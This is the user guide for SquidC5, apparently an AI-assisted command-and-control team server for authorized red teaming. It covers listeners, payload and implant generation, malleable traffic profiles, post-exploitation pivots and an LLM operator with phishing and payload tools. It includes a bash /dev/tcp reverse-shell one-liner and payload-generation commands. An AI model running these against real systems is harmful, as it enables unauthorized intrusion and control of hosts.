# SquidC5 User Guide

**Command - Control - Cognitive - Collaborative - Coordination**

**Authorized red team / penetration testing only.** 
This guide lives in the GitHub repository. It is **not** served by the C2 process (`/docs` on the server stays disabled).

**Source of truth:** [docs/user-guide.md](https://github.com/SquidSec/SquidC5/blob/master/docs/user-guide.md) on branch `master`.

| Related | Purpose |
|---------|---------|
| [Docs index](README.md) | Catalog + Diátaxis map |
| [Operator runbook](operator-runbook.md) | Day-2 procedures |
| [Deployment](deployment.md) | Lab Docker + binary prod |
| [Vision](squidc5-vision.md) | Architecture |
| [Threat model](threat-model.md) | Trust boundaries |
| [Roadmap 2026-2027](roadmap-2026-2027.md) | Planned work |
| [AGENTS.md](../AGENTS.md) | Full CLI surface |

### What C5 stands for

| Pillar | In SquidC5 |
|--------|------------|
| **Command** | Task shells and beacons; issue operator intent |
| **Control** | Auth scopes, policy engine, listeners, feature kill-switches |
| **Cognitive** | INKO + Admin AI rails + external MCP tools (allow-listed) |
| **Collaborative** | Teams, chat, handoff, shared ops console |
| **Coordination** | C2 profiles, task queues, metrics, timeline, reports |

### Concepts primer (Grokpedia)

Background reading for industry meaning of terms (external). SquidC5 still only runs under **authorized** ROE.

| Concept | Why it matters here | Grokpedia |
|---------|---------------------|-----------|
| Command and control (C2) | Team server role | [command-and-control](https://grok.com/pedia/command-and-control) |
| Red team | Authorized adversarial simulation | [red-team](https://grok.com/pedia/red-team) |
| Penetration testing | Scoped offensive assessment | [penetration-testing](https://grok.com/pedia/penetration-testing) |
| Payload | Delivered code/stage on a target | [payload](https://grok.com/pedia/payload) |
| Implant | Resident agent on a target | [implant](https://grok.com/pedia/implant) |
| Beacon | Periodic check-in implant | [beacon](https://grok.com/pedia/beacon) |
| Reverse shell | Target connects out to listener | [reverse-shell](https://grok.com/pedia/reverse-shell) |
| DNS tunneling | Covert channel over DNS | [dns-tunneling](https://grok.com/pedia/dns-tunneling) |
| Model Context Protocol | External tool bridge (MCP panel) | [model-context-protocol](https://grok.com/pedia/model-context-protocol) |

---

## Table of contents

1. [Overview](#overview)
2. [Security model](#security-model)
3. [Ops console](#ops-console)
4. [Ops console layout](#ops-console-layout)
5. [Connection](#connection)
6. [Event stream](#event-stream)
7. [Status overview](#status-overview)
8. [Identity](#identity)
9. [Sessions](#sessions)
10. [Shell](#shell)
11. [Tasks](#tasks)
12. [Listeners](#listeners)
13. [Payloads and implants](#payloads-and-implants)
14. [C2 profiles (Profiles)](#c2-profiles-profiles)
15. [Artifacts](#artifacts)
16. [Post-Ex](#post-ex)
17. [OAST Collaborator](#oast-collaborator)
18. [Plugins](#plugins)
19. [Redirector and certificates](#redirector-and-certificates)
20. [TLS certificate library](#tls-certificate-library)
21. [Observability](#observability)
22. [Timeline and reports](#timeline-and-reports)
23. [INKO (Intelligent Neural Kinetic Operator)](#inko-intelligent-neural-kinetic-operator)
24. [LLM connections](#llm-connections)
25. [Tokens](#tokens)
26. [Multi-operator collab](#multi-operator-collab)
27. [Feature toggles](#feature-toggles)
28. [Policy](#policy)
29. [MCP tools](#mcp-tools)
30. [Verified reverse shells](#verified-reverse-shells)
31. [Signal](#signal)
32. [CLI reference](#cli-reference)
33. [Deployment](#deployment)
34. [Troubleshooting](#troubleshooting)
35. [Authorized use reminder](#authorized-use-reminder)

---

## Overview

### What

SquidC5 is a **security-first, AI-native C5** platform - **Command, Control, Cognitive, Collaborative, Coordination** - for **authorized** engagements. In industry language it is a command-and-control (C2) *team server*: the hub operators use to task implants, receive output, and manage listeners during a red-team or pen-test, with AI assist and multi-operator coordination under secure defaults.

Operators use:

- **Ops UI** at `/ops` (browser console)
- **CLI** `sc5` / `squidc5-cli`
- **REST API** (scoped tokens; no public OpenAPI on the server)

### Why

- **Deny by default** - MCP off, public OpenAPI off, empty CORS, admin UI only after server-side scope check
- **Deterministic implants** - templates and fixed generators over free-form agent loops
- **Auditability** - operator, AI, MCP, and feature changes go through policy/audit
- **Port flexibility** - no hard requirement for 80/443
- **Dual AI** - external models stay on allow-listed MCP tools; INKO stays capability-gated and sanitizes untrusted input

### How

Engagement lifecycle (mental model):

1. Stand up team server + admin token
2. Open listeners for the channels you will use
3. Generate payloads/implants pointed at those listeners (and active C2 profile if HTTP)
4. Execute only on authorized targets per ROE
5. Operate via Shell (interactive) or Tasks (beacon queue)
6. Observe metrics/audit/events; hand off via chat/report
7. Tear down listeners, revoke tokens, preserve audit as required

### Example

```text
Operator (CLI /ops)
 -> API (scopes + policy)
 -> Sessions / Tasks / Listeners / Payloads / Profiles
 -> INKO + Admin AI (sandboxed) / MCP (allow-listed)
 -> SQLite data/ (local, never commit)
Implants / reverse shells -> Listeners -> Sessions
```

### See also

- [Security model](#security-model)
- [Vision](squidc5-vision.md)
- [Operator runbook](operator-runbook.md)

---

## Security model

### What

- **Tokens** `sc5_<urlsafe>` with scopes (`admin`, `sessions:read`, `shell:interact`, ...)
- **Admin UI code** served only after the server validates an admin-scoped token
- **INKO / Admin AI** sanitizes untrusted input; capabilities and chat tools are allow-listed
- **MCP** tools are per-token allow-listed; feature often off by default
- **Public docs** hard-locked off on the running server

### Why

A compromised browser or leaked non-admin token must not receive admin control surface or open-ended AI tooling.

### How

```bash
# Bootstrap token (first start) - store securely, rotate
cat data/admin_token.txt # local
# docker exec squidc5 cat /data/admin_token.txt

# Default: HTTPS with unique self-signed cert (data/tls/)
sc5 login --url https://HOST:8443 --token sc5_... --insecure
sc5 whoami
```

### Transport encryption (TLS)

New instances **generate a unique self-signed certificate** on first start (`data/tls/server.crt` + `server.key`) and serve **ops UI, API, and MCP** over HTTPS. Override with CA certs via `SQUIDC5_TLS_CERT_FILE` / `SQUIDC5_TLS_KEY_FILE`, or terminate TLS on a redirector. Manage PEMs in Ops -> **Admin** -> [TLS certificate library](#tls-certificate-library).

See [Deployment - TLS](deployment.md#tls-https-default-on-new-instances).

### Example

```bash
curl -sk https://127.0.0.1:8443/api/v1/health
# {"status":"ok"}
```

### See also

- [Threat model](threat-model.md)
- [Tokens](#tokens)
- [SECURITY.md](../SECURITY.md)

---

## Ops console

### What

Browser UI at `https://HOST:8443/ops` (HTTPS by default). Connection settings stay in **browser localStorage** only. Layout preferences are local - **never** persisted to the C2 server.

### Why

Operators need a phone-friendly and desktop console without shipping secrets back into git or requiring server-side UI preferences.

### How

1. Open `/ops` on the C2 host (same-origin avoids CORS issues).
2. Paste **API token** -> **Save & Connect**.
3. Connection panel collapses when a token is saved.
4. Use left nav for workspaces; top-bar **INKO** for chat flyout.

### Example

```text
https://127.0.0.1:8443/ops
Token: sc5_... (from data/admin_token.txt)
```

### See also

- [Ops console layout](#ops-console-layout)
- [Connection](#connection)

---

## Ops console layout

### What

The `/ops` console is an **app shell** (multi-page nav + context rail + dock).

| Region | Purpose |
|--------|---------|
| **Top bar** | Host, online status, Connect, Refresh, **INKO** flyout |
| **Left nav** | Dashboard - Sessions - **Assets** - Listeners - Payloads - **Profiles** - **Artifacts** - Post-Ex - Collab - **INKO** - Observe - Admin |
| **Main** | Active workspace for the selected nav item |
| **Right rail** | Selected session context (claim, shell, task) |
| **Bottom dock** | Live event stream + command output (resizable) |

### Why

Discoverability: pick **Sessions** -> click a row -> use the right rail. Admin-only tools live under **Admin** (server-gated).

### How

1. Connect with a scoped token.
2. Navigate with left nav (mobile: drawer).
3. Select a session to open the context rail.
4. Use bottom dock for events / console output.

### Example

```text
Sessions -> click row -> Context rail -> Shell "whoami"
Top bar -> INKO -> "list listeners"
```

### See also

- [Docs index - Ops console map](README.md#ops-console-map)
- [INKO](#inko-intelligent-neural-kinetic-operator)

---

## Connection

### What

Token + base URL used by the Ops UI (localStorage) or CLI (`~/.config/squidc5/config.json`).

### Why

Least surprise: same token model for browser and CLI; secrets stay off the git tree.

### How

- **UI:** Connect panel -> URL + token -> Save & Connect.
- **CLI:** `sc5 login --url https://HOST:8443 --token sc5_... [--insecure]`
- **Env overrides:** `SQUIDC5_URL` / `SC5_URL`, `SQUIDC5_TOKEN` / `SC5_TOKEN`

### Example

```bash
sc5 login --url https://127.0.0.1:8443 --token "$(cat data/admin_token.txt)" --insecure
sc5 config --show-token # local only
```

### See also

- [Identity](#identity)
- [CLI reference](#cli-reference)

---

## Event stream

### What

Live feed of recent server events (shell connect/verify/reject, listeners, tasks), newest first. Bottom dock in Ops; CLI `sc5 events`.

### Why

Operators need immediate feedback when a shell lands or a listener fails to bind.

### How

- **UI:** Bottom dock auto-polls / streams events.
- **CLI:** `sc5 events`

### Example events

| Event | Meaning |
|-------|---------|
| `shell.connected` | Inbound reverse shell TCP accepted |
| `shell.verified` | Exec probe passed |
| `shell.false_positive` / `session.rejected` | Noise dropped |
| `listener.started` | Listener bound and running |

### See also

- [Observability](#observability)
- [Shell](#shell)

---

## Status overview

### What

Dashboard tiles: verified shells, listeners up, active sessions, open tasks, HTTP hits, stabilized count, false shells, AI calls, uptime.

### Why

At-a-glance health without opening every panel.

### How

Open **Dashboard** after connect. Aggregates sessions, listeners, tasks, and metrics counters.

### Example

```text
Ops -> Dashboard -> tiles update on soft refresh
```

### See also

- [Signal](#signal)
- [Observability](#observability)

---

## Identity

### What

Who the token is (`sc5 whoami` / Ops identity strip): name, scopes, actor rename.

### Why

Confirm least privilege before operating; rename actors for multi-op audit clarity.

### How

```bash
sc5 whoami
# API: PUT /api/v1/me { "name": "alice" }
```

### Example

```text
scopes: admin, sessions:read, shell:interact, ...
```

### See also

- [Tokens](#tokens)
- [Multi-operator collab](#multi-operator-collab)

---

## Sessions

### What

All tracked implant/shell connections (beacons, reverse shells, closed). A **session** is SquidC5's first-class object for "something on a target that can be tasked or shelled."

### Why

- Interactive reverse shells need claim + verified channel
- Beacons need task queue association
- Closed/dead sessions should not clutter the default list

### How

1. **Ops -> Sessions** (or `sc5 sessions list`).
2. Click a row -> context rail (claim, shell, task).
3. Prefer `verified: true` before interactive shell.
4. Close or reap dead sessions when done.

### Example

```bash
sc5 sessions list
sc5 sessions list --shells
sc5 sessions get <id>
sc5 sessions close <id>
sc5 sessions reap
```

### Session kinds (operator view)

| Kind | Prefer |
|------|--------|
| `reverse_shell` / `tcp` | **Shell** after `verified: true` |
| `beacon` (HTTP/DNS/WS) | **Tasks** queue; poll for results |

### Pitfalls

| Mistake | Result |
|---------|--------|
| Shell on unverified session | Mute / probe failure |
| Task on reverse_shell only | Use Shell for interactive |
| Ignore reaped sessions | Target may have dropped |

### See also

- [Shell](#shell)
- [Tasks](#tasks)
- [Verified reverse shells](#verified-reverse-shells)

---

## Shell

### What

Interactive command runner for **verified reverse shells** only.

A **reverse shell** is a pattern where the *target* initiates a connection *outbound* to your listener, then presents a remote command line.

### Why

Outbound connections often pass egress firewalls more easily during authorized tests. Stage-2 stabilize keeps the channel reliable after capture.

### How

1. Start a `reverse_shell` listener and get a verified session.
2. **Ops -> Sessions** -> select -> Context rail -> run command, or CLI `sc5 shell`.
3. Claim the session in multi-op environments before long interactive work.

### Example

```bash
sc5 listeners create rev 4444 --kind reverse_shell
sc5 listeners start <id>
# authorized target: bash -i >& /dev/tcp/HOST/4444 0>&1
sc5 sessions list --shells
sc5 shell <session_id> "whoami"
```

### Why stage-2 stabilize

Raw reverse shells die on network blips and often lack a clean line protocol. Auto-stabilize injects a reconnecting agent (Linux Python / Windows PowerShell) that re-checks in to `SQUIDC5_PUBLIC_HOST:<port>` and supports reliable command execution. Stage-2 reconnects skip re-staging. Exec probe must pass or the session is dropped.

### Pitfalls

| Mistake | Result |
|---------|--------|
| Listener not `running` | No connect |
| Port not open / Docker bridge unpublished | Silent fail |
| Using Shell on pure beacon | No interactive channel - use Tasks |

### See also

- [Listeners](#listeners)
- [Runbook - Reverse shell](operator-runbook.md#reverse-shell)

---

## Tasks

### What

Async command queue for **beacon** implants (not interactive reverse shells). A **beacon** periodically checks in, asks for work, and returns results.

### Why

Beacons sleep between check-ins (interval + optional jitter via profiles). Tasks wait until the next poll - suitable for intermittent connectivity and reduced chatter.

### How

1. Get beacon `session_id` from Sessions.
2. Create task with command.
3. Wait for next check-in; poll task status/result.

Do **not** use Shell for pure beacons; use Tasks.

### Example

```bash
sc5 tasks create <session_id> "id"
sc5 tasks list --session <session_id>
sc5 tasks get <task_id>
```

### Lifecycle detail

`pending` -> picked up by beacon -> `running` / `completed` (or cancelled). HITL may gate high-risk commands per policy.

### See also

- [Sessions](#sessions)
- [C2 profiles (Profiles)](#c2-profiles-profiles)
- [Payloads and implants](#payloads-and-implants)

---

## Listeners

### What

Inbound channels the teamserver binds: `http`, `https`, `tcp`, `reverse_shell`, `dns`, `smtp`.

### Why

- **reverse_shell** - interactive capture
- **http / https** - beacon check-in (https for TLS implant HTTP)
- **dns / smtp** - beacon and/or [OAST](#oast-collaborator) callbacks

### How

1. **Ops -> Listeners** (or CLI) -> create name, kind, host, port.
2. **Start** the listener; confirm `running`.
3. Generate payloads pointed at that host/port.
4. For DNS, set **zone**. For OAST modes, see [Deployment - OAST](deployment.md#oast-collaborator-dns-http-smtp).

### Privileged ports

Ports &lt; 1024 need host sysctl when the process is non-root:

```bash
sysctl -w net.ipv4.ip_unprivileged_port_start=0
```

See [Deployment - Privileged ports](deployment.md#privileged-ports).

### Example

```bash
sc5 listeners create rev443 443 --kind reverse_shell
sc5 listeners start <id>
sc5 listeners list
```

### Common failure modes

| Symptom | Check |
|---------|--------|
| Create fails port in use | Another listener or host process |
| Start fails privilege | sysctl for low ports |
| Flood of rejections | Scanners - false-shell filter working |

### See also

- [Shell](#shell)
- [OAST Collaborator](#oast-collaborator)
- [Runbook - Reverse shell](operator-runbook.md#reverse-shell)

---

## Payloads and implants

### What

**Payloads** are generated scripts/binaries you deliver to an authorized target. **Implants** are the resident agents those payloads become. Generators are **deterministic templates**: same inputs -> reviewable output.

**UI:** Ops -> **Payloads** (templates, profile select, custom template register, save artifact).

### Why

- **Auditability** - know exactly what you executed
- **Reproducibility** - regenerate for a new host/port
- **Channel match** - reverse-shell templates need reverse-shell listeners; HTTP beacons need HTTP + profile shape
- **OpSec** - pair with [C2 profiles](#c2-profiles-profiles)

### How

1. Prefer activating a **C2 profile** first for HTTP surface shape ([Profiles](#c2-profiles-profiles)).
2. Choose **template** (builtin or custom).
3. Set callback **host** and **port** (scheme/zone if needed).
4. **Generate** -> review -> optional **Save artifact**.
5. Stage via approved delivery (ROE only). Confirm check-in on Events / Sessions.

Custom templates: register with placeholders `{host}` `{port}` `{path}` `{interval}` (Ops Payloads or INKO `register_payload_template`).

### Stager vs full implant (concept)

| Stage | Role in SquidC5 |
|-------|-----------------|
| Stager / template | Small first stage (`reverse_shell_*`, simple beacons) |
| Stage-2 stabilize | Server-injected reconnect agent on captured shells |
| Implant family | Higher-level generators + native `sc5beacon` |

### Example

| Template | Listener |
|----------|----------|
| `reverse_shell_bash` / `reverse_shell_python` | `reverse_shell` |
| `http_beacon_python` / `http_beacon_bash` | `http` / `https` |
| `dns_beacon_python` | `dns` + zone |
| `ws_beacon_python` | WebSocket routes |

```bash
sc5 payloads templates
sc5 payloads generate reverse_shell_bash 203.0.113.10 4444 --raw
sc5 payloads generate http_beacon_python 203.0.113.10 8443 --raw
sc5 implants build --os linux --arch amd64 C2_HOST 8443
```

### Safety checklist

- [ ] Written authorization / ROE covers the target
- [ ] Callback host/port are *your* infrastructure
- [ ] Listener is `running` before execution
- [ ] Payload archived ([Artifacts](#artifacts))
- [ ] Cleanup plan exists

### See also

- [Artifacts](#artifacts)
- [C2 profiles (Profiles)](#c2-profiles-profiles)
- [Native beacon](../agents/sc5beacon/README.md)
- [Runbook - Implants](operator-runbook.md#implants)

---

## C2 profiles (Profiles)

### What

**Malleable C2 profiles** define the *shape* of implant traffic-especially HTTP(S): URI paths, headers, body wrapping, jitter, and decoy-friendly patterns. The *active* profile is the contract between **generators** and the **server parser**.

**UI:** Ops -> **Profiles** (list, activate, create/save, push).

### Why

Default C2 fingerprints are easy to signature. Profiles change URI/header surface, support jitter, and align redirector configs.

### How

1. List profiles -> **activate** one (or create/upsert then activate).
2. Ensure an HTTP/HTTPS listener is up on the payload port.
3. **Generate payload** matched to that profile (host/port + same paths/framing).
4. After switching profiles mid-op, **regenerate** implants - old beacons keep old behavior until redeployed.
5. Optional: **push** active profile to aligned implants when supported.

### Example

```bash
sc5 profiles list
sc5 profiles activate prof_amazon_cdn
sc5 payloads generate http_beacon_python <HOST> 8443 --profile prof_amazon_cdn --raw
```

```text
Ops -> Profiles -> activate -> Payloads -> Generate (profile selected)
```

### Pitfalls

| Mistake | Result |
|---------|--------|
| Activate profile B, keep beacons built for A | Check-ins fail or never task |
| Redirector paths ≠ profile paths | 404 / silent drop at edge |
| Change profile mid-op without regen | Split fleet behavior |

### See also

- [Payloads and implants](#payloads-and-implants)
- [Redirector and certificates](#redirector-and-certificates)
- [Runbook - Malleable HTTP profiles](operator-runbook.md#malleable-http-profiles)

---

## Artifacts

### What

Saved operator assets: generated payloads, custom templates, profile snapshots, implant builds, and other blobs INKO or Ops store for reuse.

**UI:** Ops -> **Artifacts** (browse, copy, delete).

### Why

Engagement hygiene - archive what you ran; reuse custom templates without retyping; hand off assets between operators without chat paste-bin.

### How

1. Generate a payload with **Save** / `save=true`, or INKO `save_asset`.
2. Open **Artifacts** to list by kind.
3. Copy content or delete when no longer needed.
4. Custom payload templates also appear under Payloads once registered.

### Example

```text
Ops -> Payloads -> Generate -> Save artifact
Ops -> Artifacts -> filter kind=payload -> Copy
```

API: `GET/POST/DELETE /api/v1/assets` (scoped).

### See also

- [Payloads and implants](#payloads-and-implants)
- [INKO](#inko-intelligent-neural-kinetic-operator)

---

## Post-Ex

### What

Post-exploitation workspace: file ops, SOCKS pivot, modules - driven from the selected session context.

**UI:** Ops -> **Post-Ex** (and session context rail actions).

### Why

Keep interactive post-ex next to the session without leaving the console; enforce claim locks and scopes.

### How

1. Select a verified session (Sessions).
2. Open **Post-Ex** or use context rail.
3. **Files:** list / read / write / delete (`POST /api/v1/files/op`).
4. **SOCKS:** start pivot (`POST /api/v1/pivot/socks`) - implant reverse-dial (default) or direct lab mode.

### Example

```bash
# File list
curl -sk -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
 -d '{"session_id":"ses_...","op":"list","path":"/tmp"}' \
 https://C2:8443/api/v1/files/op
```

### See also

- [Runbook - SOCKS pivot](operator-runbook.md#socks-pivot)
- [Runbook - File ops](operator-runbook.md#file-ops)
- [Sessions](#sessions)

---

## OAST Collaborator

### What

Out-of-band interaction capture (Collaborator / Interactsh style) over **DNS**, **HTTP**, and **SMTP** (log-only; never relays).

### Why

Confirm SSRF, blind XSS, and other OOB callbacks during authorized tests without a separate collaborator stack.

### How

1. Deploy DNS/HTTP/(SMTP) listeners and zone per [Deployment - OAST](deployment.md#oast-collaborator-dns-http-smtp).
2. Mint a token: `sc5 oast token create --note "..."`.
3. Use returned `dns_name` / `http_url` / `smtp_to` in the test payload.
4. Poll hits: `sc5 oast hits --token T [--protocol dns|http|smtp]`.

### Example

```bash
sc5 --insecure oast token create --note "sqli-oob"
sc5 --insecure oast tokens list
sc5 --insecure oast hits --token <TOKEN>
```

### Pitfalls

| Mistake | Result |
|---------|--------|
| Zone NS not delegated | No DNS hits |
| Port 25 blocked by cloud | Use 2525 lab SMTP or skip SMTP |
| Expecting SMTP relay | SMTP is capture-only |

### See also

- [Deployment - OAST](deployment.md#oast-collaborator-dns-http-smtp)
- [Runbook - OAST](operator-runbook.md#oast-collaborator-http-dns-smtp)
- [Listeners](#listeners)

---

## Plugins

### What

Optional signed/catalog server extensions (e.g. lab recon helpers).

### Why

Keep core binary small; add curated capabilities without open-ended remote code from the internet. Plugins remain allow-listed under policy.

### How

1. **Catalog** - list available modules.
2. **Install + enable** by catalog name.
3. **Installed** - review what is loaded.

### Example

```text
Ops -> Admin / Plugins -> Catalog -> install -> enable
```

### See also

- [Feature toggles](#feature-toggles)
- [modules/bof](../modules/bof/README.md)

---

## Redirector and certificates

### What

OpSec helpers: nginx reverse-proxy snippet and TLS cert plan text for fronting the teamserver.

### Why

Fronting C2 through a redirector/CDN reduces direct exposure of the team server IP.

### How

1. Enter `server_name` and beacon URI paths (match [active profile](#c2-profiles-profiles)).
2. Generate **nginx snippet** -> deploy on redirector host.
3. Use **cert plan** for issuance steps (does not auto-issue on the droplet).
4. For teamserver PEMs, use [TLS certificate library](#tls-certificate-library).

### Example

```text
server_name: cdn.lab.example
uris: /jquery.js,/api/sync
-> nginx location blocks pointing at team server
```

### See also

- [C2 profiles (Profiles)](#c2-profiles-profiles)
- [Deployment - TLS](deployment.md#tls-https-default-on-new-instances)
- [Runbook - Malleable HTTP profiles](operator-runbook.md#malleable-http-profiles)

---

## TLS certificate library

### What

Admin library of PEM certificate/key pairs. Activate a pair for the instance TLS material (ops UI + API). Activation copies PEMs into instance TLS paths; **restart the process** (`systemctl restart squidc5`) to serve the new material.

**UI:** Ops -> **Admin** -> TLS certificates (admin scope).

### Why

Rotate or replace self-signed defaults with CA-issued certs without rebuilding the binary; keep PEMs out of git.

### How

1. Upload cert + key PEMs (admin).
2. **Activate** the desired pair.
3. Restart SquidC5 so uvicorn loads new files.
4. Verify: `curl -sk https://HOST:8443/api/v1/health` (or full verify with real CA).

Env overrides still work: `SQUIDC5_TLS_CERT_FILE` / `SQUIDC5_TLS_KEY_FILE`.

### Example

```text
Admin -> TLS -> Upload -> Activate -> systemctl restart squidc5
```

### Pitfalls

| Mistake | Result |
|---------|--------|
| Activate without restart | Old cert still served |
| Mismatched cert/key | TLS handshake failures |
| Commit PEMs to git | Secret leak - never do this |

### See also

- [Deployment - TLS](deployment.md#tls-https-default-on-new-instances)
- [Security model](#security-model)

---

## Observability

### What

Metrics counters and append-only **audit** log of operator/API/AI actions. **Observe** nav page + CLI.

### Why

After-action review, dispute resolution, and detection of misuse of the C2 itself.

### How

```bash
sc5 metrics
sc5 audit --limit 50
sc5 audit-verify --limit 500
sc5 events
```

UI: **Observe** -> Metrics / Audit / timeline controls.

### Example

```text
Ops -> Observe -> Audit log -> filter mine
```

### See also

- [Timeline and reports](#timeline-and-reports)
- [Threat model](threat-model.md)

---

## Timeline and reports

### What

Anomaly hints, chronological timeline, exportable engagement report.

### Why

Handoff and after-action need more than raw audit lines.

### How

Ops **Observe** panel buttons call observability endpoints (metrics/audit scoped). CLI:

```bash
sc5 report --raw > engagement-report.md
```

### Example

```text
Ops -> Observe -> Export report
```

### See also

- [Observability](#observability)
- [Runbook - Report export](operator-runbook.md#report-export)

---

## INKO (Intelligent Neural Kinetic Operator)

### What

**INKO** is SquidC5's **Intelligent Neural Kinetic Operator**: the in-ops neural operator for chat-driven inspection and railed actions on the teamserver.

| Surface | Behavior |
|---------|----------|
| Top-bar **INKO** | Right flyout (~440px desktop; full width mobile). Backdrop / Escape closes |
| Nav **INKO** | Full workspace: connection + **model** selects, status, tools, page chat |
| Chat | Multi-turn; Enter send, Shift+Enter newline; "Thinking..." while pending |
| History | Browser `localStorage`; New chat / Clear wipes thread |
| Markdown | Safe render (escaped HTML; fenced code; https links; ordered/unordered lists; tables) |
| Server | Sandboxed Admin AI - allow-listed tools, `sanitize_untrusted`, policy/HITL, audit |

Structured Admin AI capabilities (`recon_assist`, `shell_classify`, ...) remain via API/CLI. **INKO chat** is the primary operator surface.

On each chat turn the server system prompt includes C5 purpose, object model, workflows, and tool playbook so INKO answers in-product.

### Why

Red team ops need AI that lives *inside* the C5 with the same scopes and audit as humans - not a browser tab that never saw your HITL policy.

### How

1. Configure a BYO LLM under **Admin** -> [LLM connections](#llm-connections) (or `sc5 llm add`). Optional - offline intents still handle phrases like "list sessions".
2. Open **INKO** (needs `ai:use` or `admin`).
3. Pick **connection** and **model** (models load from provider; switching can PATCH the connection default).
4. Ask INKO to inspect or act. Approve HITL when required.
5. Review audit for `ai.chat.tool.*` / `ai.admin.chat`.

### Chat API

```http
POST /api/v1/ai/chat
Authorization: Bearer <token with ai:use|admin>
Content-Type: application/json

{
 "message": "Setup a reverse shell listener on 4444 and start it",
 "history": [{"role": "user", "content": "..."}, {"role": "assistant", "content": "..."}],
 "llm_id": optional,
 "model": optional,
 "max_rounds": 6
}
```

Response: `reply`, `mode` (`llm`|`offline`), `tool_trace`.

Tool catalog (no secrets): `GET /api/v1/ai/tools`.

Railed tools include (scopes + policy): `list_sessions`, `get_session`, `list_listeners`, `create_listener`, `start_listener`, `stop_listener`, `list_tasks`, `create_task`, `generate_payload`, `list_payload_templates`, `register_payload_template`, `save_asset`, `list_assets`, `list_profiles`, `activate_profile`, `upsert_profile`, `get_metrics`, `list_recent_events`, `list_audit`, `get_platform_status`, `interact_shell` (HITL when required).

### Example

```bash
sc5 ai recon_assist --data "windows domain, no creds yet"
sc5 ai shell_classify --data "session looks like scanner"
sc5 llm list
```

```text
Ops -> INKO -> connection grok-prod -> model grok-4.5 -> "list sessions"
```

### Admin AI (structured capabilities)

Capability runner behind INKO (`POST /api/v1/ai/run`). Fixed functions - not an open agent loop.

| Capability | Intent |
|------------|--------|
| `recon_assist` | Structured recon suggestions |
| `shell_classify` | Classify shell/session context |
| `payload_template` | Template guidance |
| `phishing_asset` | Authorized phishing content assist |
| `doc_generate` | Engagement documentation drafts |
| `session_triage` / `task_suggest` / `opsec_review` / ... | Full allow-list in product |

Phishing-related capabilities exist only for **authorized** engagements under ROE.

### Pitfalls

| Mistake | Result |
|---------|--------|
| No LLM configured | Offline intents only |
| Missing `ai:use` | Chat 403 |
| Expecting open agent | Tools are allow-listed and round-bounded |

### See also

- [LLM connections](#llm-connections)
- [Runbook - INKO](operator-runbook.md#inko-intelligent-neural-kinetic-operator)
- [Vision - Dual AI](squidc5-vision.md#dual-ai-architecture)

---

## LLM connections

### What

BYO OpenAI-compatible endpoints (xAI Grok, OpenAI, Groq, OpenRouter, Ollama, ...) stored **server-side** in `data/`. Keys encrypted at rest; **never** returned by status APIs.

### Why

INKO needs a model; keys must never land in git or browser responses.

### How

**Ops UI:** **Admin** -> Configure LLM -> provider preset -> paste key -> **Refresh models** (server proxies `/models`, SSRF-guarded). INKO model switcher can PATCH default model without re-entering the key.

**CLI:**

```bash
sc5 llm add grok-prod grok-3 --provider xai --base-url https://api.x.ai/v1 --api-key "$XAI_KEY"
sc5 llm list
```

| API | Notes |
|-----|--------|
| `GET/POST /api/v1/llm` | List / add connections |
| `PATCH /api/v1/llm/{id}` | Switch default model (preserves key) |
| `POST /api/v1/llm/models` | Probe models (`llm_id` for `ai:use`; raw URL needs manage scope) |
| `GET /api/v1/ai/status` | Presence only - **no keys** |

### Example

```text
Admin -> LLM -> xAI -> Refresh models -> Save
INKO flyout -> connection + model selects
```

### See also

- [INKO](#inko-intelligent-neural-kinetic-operator)
- [Security model](#security-model)

---

## Tokens

### What

Mint, **update scopes**, list, and revoke scoped API tokens for operators, automation, or MCP. Ops nav only shows pages your scopes allow.

### Why

Least privilege: phone UI might only need `shell:interact` + `sessions:read`; external AI needs `mcp:connect` + tool allow-list. Editing scopes does **not** rotate the secret - revoke if compromised.

### How

1. **Admin -> Tokens** (needs `tokens:manage` or `admin`).
2. Pick a **preset** (short description under the buttons):
   - **Full operator** - all day-to-day ops (shells, listeners, payloads, profiles, OAST, collab, INKO) - never admin
   - **Operator** - shells, tasks, collab - no payload/profile edits
   - **Read-only + INKO** - observe + AI - cannot create listeners/tasks/payloads
   - **Read only** - observe only - no writes, no AI
   - **Listener ops** - bind/manage listeners
   - **Payload / profiles** - implants and C2 profiles
   - **Phone shell** - minimal phone interact
   - **INKO + operate** - AI plus shell/tasks/payloads (still non-admin)
   - **MCP external AI** - external model, default safe tools
   - **Token admin** / **Full admin** - privileged (admin granters only)
   - **All non-admin** - every non-privileged scope (never sets `admin`)
3. **Mint new** - a green banner shows the secret **and a connection link** (`/ops#sc5=...`) until you **Close** it.
4. **Link** on an existing token issues a **one-time** URL (`/ops#sc5ticket=...`) without showing the secret. Send that URL to the operator.
5. When they open the link, the browser redeems the ticket, **rolls** their secret once, and auto-connects. The previous secret stops working.
6. **Edit** a row to change name/scopes/MCP tools without rotating the secret.
7. **Roll** rotates the secret immediately (admin sees the new secret in the banner).
8. **Revoke** disables the token entirely.
9. Nav hides Profiles, Post-Ex, etc. when the connected token lacks those scopes.

### Example

```bash
sc5 tokens create phone --scopes "sessions:read,shell:interact,metrics:read,collab:use,phone:operator"
sc5 tokens link <id> --ttl 3600   # one-time URL; redeem rolls secret
sc5 tokens update <id> --scopes "sessions:read,shell:interact,metrics:read,listeners:read"
sc5 tokens roll <id>
sc5 tokens list
sc5 tokens revoke <id>
```

### See also

- [Identity](#identity)
- [MCP tools](#mcp-tools)
- [Ops console layout](#ops-console-layout)
- [Runbook - Tokens](operator-runbook.md#tokens)

---

## Multi-operator collab

### What

Teams, **session claim/lock** (TTL + renew on activity), handoff packs, spectator snapshots, operator presence, team-scoped chat, per-operator audit filters, and the **Assets** host graph.

**UI:** Ops -> **Collab** (teams/chat) · Ops -> **Assets** (host graph).

### Why

Two operators must not stomp the same shell; shift changes need context; leads need read-only watch; operators need a host-centric map of implants/access.

### How

| Action | API / UI |
|--------|----------|
| Host inventory / graph | `GET /api/v1/hosts` - Ops -> **Assets** (verified/interactive shells + implants only) |
| Drop host from graph | `POST /api/v1/hosts/{id}/hide` - Assets → **Drop** (sessions kept) |
| Restore host | `DELETE /api/v1/hosts/{id}/hide` - **Show dismissed** → Restore |
| Claim session | `POST /api/v1/sessions/{id}/claim` `{force?, ttl_sec?}` - Context -> Claim lock |
| Force claim | same endpoint with `force: true` (admin) |
| Release | `POST /api/v1/sessions/{id}/release` |
| Handoff pack | `POST /api/v1/sessions/{id}/handoff` `{to, note}` |
| Spectate | `GET /api/v1/sessions/{id}/spectator` |
| Presence | `POST/GET /api/v1/collab/presence` |
